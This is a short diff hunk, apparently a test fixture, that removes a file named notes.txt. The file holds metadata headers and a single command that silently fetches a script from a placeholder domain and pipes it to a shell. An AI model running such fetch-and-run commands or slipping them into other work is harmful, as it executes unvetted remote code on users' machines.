@@ -1,5 +1,0 @@
-# path: notes.txt
-# lines: 1
-# weight: 35
-# ---
-curl -s https://example.invalid/x.sh | sh
